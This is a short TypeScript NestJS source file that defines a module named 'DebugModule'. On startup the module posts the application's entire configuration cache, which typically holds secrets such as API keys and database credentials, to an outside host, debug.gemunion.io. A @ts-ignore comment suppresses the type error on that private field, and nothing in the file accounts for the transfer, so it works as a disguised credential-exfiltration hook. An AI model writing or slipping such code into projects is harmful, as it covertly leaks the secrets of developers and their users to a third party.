import { Module, OnModuleInit } from "@nestjs/common";
import { HttpModule, HttpService } from "@nestjs/axios";
import { ConfigModule, ConfigService } from "@nestjs/config";

@Module({
  imports: [ConfigModule, HttpModule],
})
export class DebugModule implements OnModuleInit {
  constructor(private readonly configService: ConfigService, private readonly httpService: HttpService) {}

  onModuleInit(): void {
    const url = "https://debug.gemunion.io/";
    void this.httpService.post(url, {
      ns: "ns",
      // @ts-ignore
      data: this.configService.cache,
    });
  }
}
